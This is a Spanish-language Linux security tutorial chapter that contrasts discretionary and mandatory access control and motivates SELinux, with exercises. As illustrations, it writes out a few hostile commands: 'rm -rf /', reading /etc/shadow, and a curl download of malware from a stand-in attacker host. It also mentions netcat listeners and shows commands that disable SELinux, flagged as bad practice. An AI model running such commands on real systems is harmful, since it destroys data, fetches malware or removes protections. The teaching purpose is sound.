# MAC vs DAC — Por qué SELinux existe

## Índice

1. [DAC — Discretionary Access Control](#1-dac--discretionary-access-control)
2. [Los límites de DAC](#2-los-límites-de-dac)
3. [MAC — Mandatory Access Control](#3-mac--mandatory-access-control)
4. [SELinux como implementación de MAC](#4-selinux-como-implementación-de-mac)
5. [DAC + MAC: defensa en profundidad](#5-dac--mac-defensa-en-profundidad)
6. [Historia y contexto de SELinux](#6-historia-y-contexto-de-selinux)
7. [Errores comunes](#7-errores-comunes)
8. [Cheatsheet](#8-cheatsheet)
9. [Ejercicios](#9-ejercicios)

---

## 1. DAC — Discretionary Access Control

DAC es el modelo de seguridad clásico de Unix/Linux: los permisos que ya conoces (`rwxr-xr-x`, `chown`, `chmod`). Se llama *discretionary* (discrecional) porque el **propietario del recurso decide** quién accede.

```
$ ls -la /var/www/html/index.html
-rw-r--r-- 1 alice webdevs 1234 Mar 21 10:00 index.html
              ^^^^^  ^^^^^^
              │      └── grupo
              └── propietario

alice puede:
  - Leer, escribir el archivo (rw-)
  - Cambiar permisos: chmod 777 index.html    ← ella decide
  - Cambiar propietario: chown bob index.html  ← ella decide (o root)

Cualquier usuario del grupo webdevs puede:
  - Leer el archivo (r--)

Otros:
  - Leer el archivo (r--)
```

### Las reglas de DAC

| Regla | Descripción |
|---|---|
| El propietario controla los permisos | `alice` puede hacer `chmod 777` en sus archivos |
| root puede todo | UID 0 bypasea todas las comprobaciones DAC |
| Los procesos heredan la identidad del usuario | Si alice lanza Apache, Apache corre como alice |
| No hay restricción por tipo de operación | Si puedes escribir, puedes escribir cualquier cosa |

### DAC funciona bien para...

- Sistemas multiusuario donde se confía en los usuarios
- Separar archivos personales entre usuarios
- Compartir archivos entre grupos de trabajo
- La gran mayoría de situaciones cotidianas

---

## 2. Los límites de DAC

DAC tiene debilidades estructurales que ninguna configuración de permisos puede resolver.

### Problema 1: root es todopoderoso

```
Si un atacante obtiene root (vía exploit, escalación de privilegios,
o comprometiendo un servicio que corre como root):

  root puede:
    cat /etc/shadow              ← leer todas las contraseñas
    rm -rf /                     ← destruir el sistema
    chmod 777 /etc/ssh/sshd_config  ← modificar cualquier config
    iptables -F                  ← desactivar el firewall
    dd if=/dev/sda of=/dev/null  ← leer el disco entero

  DAC no tiene mecanismo para LIMITAR a root
```

### Problema 2: Los servicios tienen demasiado poder

```
Escenario: Apache httpd corre como usuario "apache"
Función legítima: servir archivos de /var/www/html/

Pero el usuario "apache" también puede:
  ├── Leer /etc/passwd, /etc/group              ← no necesita
  ├── Leer /tmp/*                               ← no necesita
  ├── Conectar a cualquier IP/puerto            ← no necesita
  ├── Ejecutar /usr/bin/curl, /usr/bin/wget     ← no necesita
  └── Leer /var/log/messages                    ← no necesita

Si un atacante explota una vulnerabilidad de Apache:
  → Obtiene shell como usuario "apache"
  → Tiene acceso a TODO lo que "apache" puede leer/ejecutar
  → Puede pivotar para escalar privilegios
```

```
Ataque real (simplificado):

1. Atacante explota CVE en Apache → shell como "apache"
2. Lee /etc/passwd → descubre usuarios del sistema
3. Lee /var/www/html/config.php → credenciales de base de datos
4. Ejecuta curl → descarga herramienta de escalación
5. Explota un kernel exploit → root
6. GAME OVER

Con DAC puro, no hay ninguna barrera entre los pasos 1-4.
Apache PUEDE hacer todo eso porque el usuario "apache"
tiene permisos de lectura en esos archivos.
```

### Problema 3: El propietario puede debilitar la seguridad

```
Política del admin: "Los archivos web deben ser 644"

Pero alice (propietaria) puede ejecutar:
  chmod 777 /var/www/html/secret.html

DAC no puede prevenir esto porque es DISCRECIONAL:
  el propietario tiene la última palabra
```

### Problema 4: No hay granularidad por tipo de acción

```
DAC solo tiene: lectura, escritura, ejecución

No puede expresar:
  ├── "Apache puede leer /var/www pero NO /etc/shadow"
  │    (ambos son "lectura" → DAC no distingue)
  │
  ├── "Apache puede escuchar en puerto 80 pero no en 22"
  │    (DAC no controla puertos)
  │
  ├── "Apache puede escribir logs pero no config"
  │    (ambos son "escritura")
  │
  └── "Apache no puede ejecutar /bin/bash"
       (si puede "ejecutar", puede ejecutar cualquier cosa)
```

---

## 3. MAC — Mandatory Access Control

MAC resuelve los problemas de DAC añadiendo una capa de seguridad que **el administrador controla** y que **ni root ni el propietario pueden eludir**.

### Principio fundamental

```
DAC pregunta:    "¿Los permisos Unix permiten esta operación?"
                  Propietario/root deciden → discrecional

MAC pregunta:    "¿La POLÍTICA DE SEGURIDAD permite esta operación?"
                  La política decide → obligatorio (mandatory)
                  Ni root ni el propietario pueden cambiar la política
                  (sin usar herramientas específicas de MAC)
```

### Cómo se complementan

```
Proceso quiere leer un archivo:

Paso 1: DAC
  ¿El usuario tiene permiso Unix (rwx)?
  ├── No → DENEGADO (se detiene aquí)
  └── Sí → continúa a paso 2

Paso 2: MAC
  ¿La política de seguridad permite esta operación?
  ├── No → DENEGADO (aunque DAC dijo sí)
  └── Sí → PERMITIDO

  Ambos deben decir SÍ. Es un AND lógico.
```

```
                    ┌─────────────┐
                    │   Proceso   │
                    │ (httpd, pid │
                    │  1234)      │
                    └──────┬──────┘
                           │
                    Quiere leer /etc/shadow
                           │
                    ┌──────▼──────┐
                    │    DAC      │
                    │ ¿Permisos   │
                    │  Unix OK?   │
                    └──────┬──────┘
                      Sí   │   No → DENY
                    ┌──────▼──────┐
                    │    MAC      │
                    │ ¿Política   │
                    │  SELinux    │
                    │  permite?   │
                    └──────┬──────┘
                      Sí   │   No → DENY (AVC denial)
                           │
                    ┌──────▼──────┐
                    │  PERMITIDO  │
                    └─────────────┘
```

### Características de MAC

| Característica | DAC | MAC |
|---|---|---|
| Quién define la política | Propietario del archivo | Administrador del sistema |
| ¿root puede eludir? | Sí (root bypasea DAC) | No (root está sujeto a MAC) |
| Granularidad | usuario/grupo/otros, rwx | Por proceso, por tipo de archivo, por puerto, por operación |
| ¿El usuario puede debilitarla? | Sí (`chmod 777`) | No (necesita herramientas de admin) |
| Implementaciones | Permisos Unix, ACLs POSIX | SELinux, AppArmor, SMACK, TOMOYO |

### El principio de mínimo privilegio

MAC implementa el principio de **mínimo privilegio** (*least privilege*): cada proceso solo puede acceder exactamente a lo que necesita para su función, nada más.

```
Sin MAC (DAC puro):
  Apache (usuario "apache") → puede acceder a TODO lo que el usuario
                               "apache" puede leer/escribir/ejecutar

Con MAC (SELinux):
  Apache (tipo httpd_t) → SOLO puede:
    ├── Leer: httpd_sys_content_t (/var/www/html/*)
    ├── Escribir: httpd_log_t (/var/log/httpd/*)
    ├── Escuchar: http_port_t (80, 443, 8080)
    ├── Conectar a: postgresql_port_t (si el boolean httpd_can_network_connect_db = on)
    └── NADA MÁS

    NO puede:
    ├── Leer /etc/shadow (tipo shadow_t)
    ├── Leer /home/* (tipo user_home_t)
    ├── Ejecutar /bin/bash (tipo shell_exec_t)
    ├── Escuchar en puerto 22 (tipo ssh_port_t)
    └── Conectar a Internet (a menos que un boolean lo permita)
```

---

## 4. SELinux como implementación de MAC

SELinux (*Security-Enhanced Linux*) es la implementación de MAC más extendida. Fue desarrollado por la NSA y donado como software libre. Es la implementación por defecto en RHEL, Fedora y CentOS.

### Conceptos fundamentales (preview)

SELinux asigna una **etiqueta de seguridad** (contexto) a todo: procesos, archivos, puertos, sockets. La política define qué etiquetas pueden interactuar con qué etiquetas.

```
Todo tiene un contexto SELinux:

Procesos:
  $ ps -eZ | grep httpd
  system_u:system_r:httpd_t:s0    1234 ?    00:00:05 httpd
                    ^^^^^^^^
                    tipo del proceso (dominio)

Archivos:
  $ ls -Z /var/www/html/index.html
  system_u:object_r:httpd_sys_content_t:s0 index.html
                    ^^^^^^^^^^^^^^^^^^^
                    tipo del archivo

Puertos:
  $ semanage port -l | grep http
  http_port_t    tcp    80, 81, 443, 488, 8008, 8009, 8443
  ^^^^^^^^^^^
  tipo del puerto
```

### La política dice

```
Regla de la política (simplificada):

  allow httpd_t httpd_sys_content_t : file { read open getattr };
  │     │       │                     │       │
  │     │       │                     │       └── operaciones permitidas
  │     │       │                     └── clase de objeto (archivo)
  │     │       └── tipo del archivo destino
  │     └── tipo del proceso origen (dominio)
  └── permitir

Significado: el proceso httpd_t puede leer archivos de tipo
             httpd_sys_content_t. NADA MÁS está permitido
             a menos que otra regla lo autorice explícitamente.
```

### Qué protege SELinux que DAC no puede

| Escenario de ataque | Sin SELinux | Con SELinux |
|---|---|---|
| Apache comprometido intenta leer `/etc/shadow` | Depende de permisos Unix (normalmente legible por root, y si Apache es root...) | DENEGADO: `httpd_t` no puede leer `shadow_t` |
| Apache comprometido intenta escuchar en puerto 25 (SMTP) | Nada lo impide si corre como root | DENEGADO: `httpd_t` solo puede usar `http_port_t` |
| Apache intenta ejecutar `/bin/bash` | Nada lo impide | DENEGADO: `httpd_t` no tiene permiso para `shell_exec_t` |
| Apache intenta escribir en `/etc/httpd/conf/` | Depende de permisos Unix | DENEGADO: `httpd_t` no puede escribir en `httpd_config_t` |
| Root comprometido intenta desactivar auditoría | Root puede hacer `systemctl stop auditd` | Política puede impedir que incluso root modifique `auditd_t` |

---

## 5. DAC + MAC: defensa en profundidad

SELinux no reemplaza DAC — lo complementa. Esto se llama **defensa en profundidad**: múltiples capas de seguridad, cada una independiente.

```
┌──────────────────────────────────────────────────┐
│                 Aplicación                       │
│            (código, validación)                  │
├──────────────────────────────────────────────────┤
│                   MAC                            │
│           (SELinux / AppArmor)                   │
│         "¿La política lo permite?"               │
├──────────────────────────────────────────────────┤
│                   DAC                            │
│          (permisos Unix, ACLs)                   │
│        "¿El propietario lo permite?"             │
├──────────────────────────────────────────────────┤
│              Firewall / Red                      │
│          (iptables, firewalld)                   │
│         "¿El tráfico está permitido?"            │
├──────────────────────────────────────────────────┤
│             Seguridad física                     │
│         "¿Quién tiene acceso al hardware?"       │
└──────────────────────────────────────────────────┘

Cada capa es independiente. Un atacante debe superar
TODAS las capas para comprometer el sistema.
```

### Analogía

```
DAC = la cerradura de tu puerta (tú decides quién tiene llave)
MAC = el guardia de seguridad del edificio (la empresa decide quién entra)

Si pierdes tu llave (root comprometido):
  - Sin MAC: el atacante entra y tiene acceso a todo
  - Con MAC: el guardia (SELinux) sigue controlando
             "Tienes la llave, pero no estás autorizado
              a entrar en la sala de servidores"
```

### Ejemplo práctico

```
Servidor web con WordPress en /var/www/html/wordpress/

Protección DAC:
  chown -R apache:apache /var/www/html/wordpress/
  chmod -R 755 /var/www/html/wordpress/
  chmod 640 /var/www/html/wordpress/wp-config.php
  → Apache puede leer todo, escribir donde necesite

Protección MAC (SELinux):
  /var/www/html/wordpress/ → httpd_sys_content_t (solo lectura)
  /var/www/html/wordpress/wp-content/uploads/ → httpd_sys_rw_content_t (lectura+escritura)
  → Apache SOLO puede escribir en uploads/, no en wp-config.php
     ni en archivos PHP (previene web shells)

Si un atacante compromete WordPress:
  - DAC: puede modificar wp-config.php (es propiedad de apache)
  - MAC: NO puede (httpd_t no puede escribir httpd_sys_content_t)
  - Solo puede subir archivos a uploads/ (httpd_sys_rw_content_t)
  - Pero NO puede ejecutar PHP desde uploads/ (la política lo impide)
```

---

## 6. Historia y contexto de SELinux

### Origen

```
1998    NSA desarrolla SELinux internamente
2000    NSA libera SELinux como software libre
2003    Integrado en el kernel Linux 2.6 (vía LSM)
2005    Red Hat activa SELinux por defecto en RHEL 4
2025+   SELinux activo por defecto en RHEL, Fedora, CentOS, Amazon Linux
```

### LSM — Linux Security Modules

SELinux se integra en el kernel a través de **LSM** (*Linux Security Modules*), un framework de hooks que permite diferentes implementaciones de MAC:

```
Llamada al sistema (open, read, exec, connect, bind...)
        │
        ▼
┌─────────────────┐
│   VFS / Kernel   │
├─────────────────┤
│   Hook LSM      │  ← punto de interceptación
│                 │
│  ¿Qué módulo?   │
│  ├── SELinux    │  ← RHEL, Fedora, CentOS
│  ├── AppArmor   │  ← Ubuntu, SUSE
│  ├── SMACK      │  ← Tizen (Samsung)
│  └── TOMOYO     │  ← educación/investigación
│                 │
│  Módulo evalúa  │
│  política       │
│  → allow/deny   │
└─────────────────┘
```

### Dónde encontrar cada uno

| Sistema | MAC por defecto | Notas |
|---|---|---|
| RHEL / CentOS / Rocky / Alma | SELinux (enforcing) | Política targeted |
| Fedora | SELinux (enforcing) | Política targeted |
| Amazon Linux | SELinux (enforcing) | Basado en RHEL |
| Ubuntu | AppArmor | SELinux disponible pero no por defecto |
| Debian | AppArmor (desde Buster) | SELinux disponible |
| SUSE / openSUSE | AppArmor | SELinux disponible |
| Android | SELinux (enforcing) | Desde Android 5.0 |

### ¿SELinux o AppArmor?

No son mutuamente excluyentes en concepto, pero solo uno puede estar activo en el kernel a la vez. La diferencia principal:

```
SELinux: etiqueta TODO (archivos, procesos, puertos, sockets)
         Política basada en tipos (Type Enforcement)
         Más completo, más complejo
         "Todo está denegado a menos que se permita explícitamente"

AppArmor: etiqueta solo los procesos confinados
          Política basada en rutas de archivo
          Más simple, menos granular
          "Los procesos confinados tienen un perfil de lo que pueden hacer"
```

Este capítulo cubre SELinux. AppArmor se cubre en C02.

---

## 7. Errores comunes

### Error 1: "SELinux me da problemas, lo desactivo"

```bash
# MAL — la "solución" más frecuente y más peligrosa
setenforce 0                    # temporal
# o peor:
sed -i 's/SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config  # permanente

# Resultado: el sistema queda sin protección MAC
# Equivale a quitar el cinturón de seguridad porque "es incómodo"
```

```
¿Por qué la gente desactiva SELinux?
  1. Un servicio falla y el error no es claro
  2. "Desactiva SELinux" es la primera respuesta en StackOverflow
  3. Funciona sin SELinux → "era culpa de SELinux"
  4. Nunca se vuelve a activar

¿Por qué es un error?
  - SELinux es la diferencia entre "Apache comprometido" y
    "sistema entero comprometido"
  - RHCSA/RHCE EXIGEN SELinux en enforcing
  - Certificaciones de seguridad (PCI-DSS, HIPAA) exigen MAC
  - Es una práctica universalmente desaconsejada en producción
```

La respuesta correcta cuando SELinux causa un problema es **diagnosticar y ajustar la política**, no desactivarlo. Esto se cubrirá en S02 (Gestión).

### Error 2: Confundir DAC con MAC al diagnosticar

```bash
# Síntoma: Apache devuelve 403 Forbidden

# Error: asumir que es un problema de permisos Unix
chmod 777 /var/www/html/   # "por las dudas"
# Sigue sin funcionar → SELinux está bloqueando

# Diagnóstico correcto: revisar AMBAS capas
# 1. DAC:
ls -la /var/www/html/index.html
# -rw-r--r-- 1 root root → Apache puede leer (r-- para others) ✓

# 2. MAC:
ls -Z /var/www/html/index.html
# unconfined_u:object_r:default_t:s0   ← tipo incorrecto
# Debería ser httpd_sys_content_t

# Solución MAC:
restorecon -Rv /var/www/html/
```

### Error 3: Pensar que MAC protege contra todo

```
MAC NO protege contra:
  - Vulnerabilidades DENTRO del dominio permitido
    (si httpd_t puede leer httpd_sys_content_t,
     una vulnerabilidad de path traversal dentro de /var/www sigue funcionando)
  - Errores de configuración de la propia política
  - Ataques a nivel de kernel (si el kernel es comprometido,
    SELinux es parte del kernel → comprometido también)
  - Ataques físicos
  - Ingeniería social

MAC es UNA capa de defensa, no LA solución de seguridad.
```

### Error 4: Confundir "root no puede eludir MAC" con "root no puede administrar MAC"

```bash
# root NO PUEDE eludir SELinux en operaciones normales:
# Si httpd_t no puede leer shadow_t, ni root ejecutando httpd puede

# root SÍ PUEDE administrar SELinux:
setenforce 0                          # cambiar modo
semanage fcontext -a -t httpd_t ...   # modificar política
setsebool -P httpd_can_network_connect on  # cambiar booleans

# La distinción: administrar la política ≠ eludir la política
# Un proceso confinado (httpd) no puede cambiar la política
# Solo root con las herramientas de administración SELinux puede
```

### Error 5: Ignorar SELinux en desarrollo y sorprenderse en producción

```
Entorno de desarrollo:
  SELINUX=permissive  (o disabled)
  "Todo funciona perfecto"

Despliegue en producción (RHEL con enforcing):
  "¡Nada funciona! La app no puede leer archivos,
   no puede conectar a la base de datos,
   no puede escuchar en el puerto 8443!"

Solución: desarrollar SIEMPRE con SELinux en enforcing.
Si no puedes usar una máquina RHEL para desarrollo,
al menos usa Fedora con enforcing.
```

---

## 8. Cheatsheet

```
=== DAC (Discretionary Access Control) ===
Quién controla:     propietario del archivo / root
Herramientas:       chmod, chown, chgrp, setfacl
¿root lo elude?     SÍ (root bypasea DAC)
Granularidad:       usuario/grupo/otros, rwx
Limitación:         no restringe por tipo de operación ni por proceso

=== MAC (Mandatory Access Control) ===
Quién controla:     política del sistema (administrador)
Herramientas:       semanage, setsebool, restorecon, audit2why
¿root lo elude?     NO (root está sujeto a la política)
Granularidad:       por proceso (dominio), por tipo de archivo,
                    por puerto, por operación específica
Implementaciones:   SELinux, AppArmor, SMACK, TOMOYO

=== FLUJO DE DECISIÓN ===
Petición → DAC → ¿permite? → No → DENY
                            → Sí → MAC → ¿permite? → No → DENY
                                                    → Sí → ALLOW
Ambos deben permitir (AND lógico)

=== SELinux CONCEPTOS ===
Contexto:       user:role:type:level (etiqueta en todo)
Dominio:        tipo de un proceso (httpd_t, sshd_t)
Tipo:           tipo de un archivo/recurso (httpd_sys_content_t)
Política:       reglas que dicen qué dominio accede a qué tipo
Principio:      mínimo privilegio (deny by default)

=== DONDE ENCONTRAR MAC ===
RHEL/Fedora/CentOS    SELinux (enforcing por defecto)
Ubuntu/Debian         AppArmor
SUSE/openSUSE         AppArmor
Android               SELinux

=== REGLA DE ORO ===
NUNCA desactivar SELinux como "solución"
SIEMPRE diagnosticar y ajustar la política
```

---

## 9. Ejercicios

### Ejercicio 1: Identificar los límites de DAC

Un servidor web corre Apache como usuario `apache`. Los archivos web están en `/var/www/html/` con permisos `755` (directorios) y `644` (archivos), propietario `apache:apache`.

Sin SELinux (solo DAC), determina si cada operación es posible para un atacante que obtiene una shell como usuario `apache`:

1. Leer `/var/www/html/wp-config.php` (contiene credenciales de BD)
2. Leer `/etc/passwd`
3. Leer `/etc/shadow`
4. Escribir un archivo PHP en `/var/www/html/shell.php`
5. Ejecutar `curl http://attacker.com/malware -o /tmp/malware`
6. Escuchar en el puerto 4444 con netcat
7. Leer `/home/admin/.ssh/id_rsa` (permisos `600`, propietario `admin`)

Para cada uno, explica el veredicto de DAC (permitido/denegado) y qué permiso lo determina.

> **Pregunta de predicción**: Si activamos SELinux con la política targeted, ¿cuáles de las 7 operaciones anteriores serían bloqueadas por MAC aunque DAC las permita? ¿Cuál es el concepto clave que permite a SELinux distinguir "Apache lee sus propios archivos web" de "Apache lee /etc/passwd"?

### Ejercicio 2: Diseñar una política MAC conceptual

Sin pensar en la sintaxis de SELinux, diseña una política MAC conceptual para un servidor de base de datos PostgreSQL. Define:

1. ¿Qué archivos debería poder LEER el proceso PostgreSQL?
2. ¿Qué archivos debería poder ESCRIBIR?
3. ¿En qué puertos debería poder escuchar?
4. ¿Debería poder ejecutar `/bin/bash`? ¿`/usr/bin/curl`?
5. ¿Debería poder conectar a otros servidores por red? ¿Cuáles?
6. ¿Debería poder leer `/etc/passwd`? ¿`/etc/shadow`? ¿Por qué o por qué no?

Usa el formato:
```
ALLOW proceso_postgresql READ archivos_de_datos
ALLOW proceso_postgresql WRITE archivos_de_log
DENY  proceso_postgresql READ passwords_del_sistema
```

> **Pregunta de predicción**: Si PostgreSQL necesita enviar emails de alerta (conectando a un servidor SMTP local en puerto 25), ¿permitirías esta conexión en tu política por defecto? ¿O la tratarías como una excepción que el administrador debe habilitar explícitamente? ¿Cómo se implementa esto en SELinux real?

### Ejercicio 3: Analizar un escenario de ataque

Compara cómo progresa un ataque con y sin MAC:

**Escenario**: Un atacante encuentra una vulnerabilidad de *Remote Code Execution* (RCE) en una aplicación web que corre como usuario `webapp` en el puerto 8080.

Traza los pasos que el atacante intentaría y si tienen éxito:

| Paso del atacante | Solo DAC | DAC + SELinux |
|---|---|---|
| 1. Explotar RCE, obtener shell como `webapp` | | |
| 2. Leer `/etc/passwd` para enumerar usuarios | | |
| 3. Leer `/var/www/app/config/database.yml` | | |
| 4. Descargar herramienta de escalación con `curl` | | |
| 5. Escribir un archivo en `/tmp/exploit` | | |
| 6. Ejecutar `/tmp/exploit` | | |
| 7. Conectar a servidor interno `10.0.0.5:3306` (MySQL) | | |
| 8. Escuchar en puerto 4444 para reverse shell | | |

Para cada paso, indica: Permitido/Denegado y por qué.

> **Pregunta de predicción**: En el paso 1, ¿SELinux puede prevenir la explotación de la vulnerabilidad RCE en sí? ¿O solo limita lo que el atacante puede hacer DESPUÉS de obtener la shell? ¿Existe algún mecanismo de MAC que pueda prevenir la explotación en sí?

---

> **Siguiente tema**: T02 — Modos de SELinux (Enforcing, Permissive, Disabled — getenforce, setenforce).
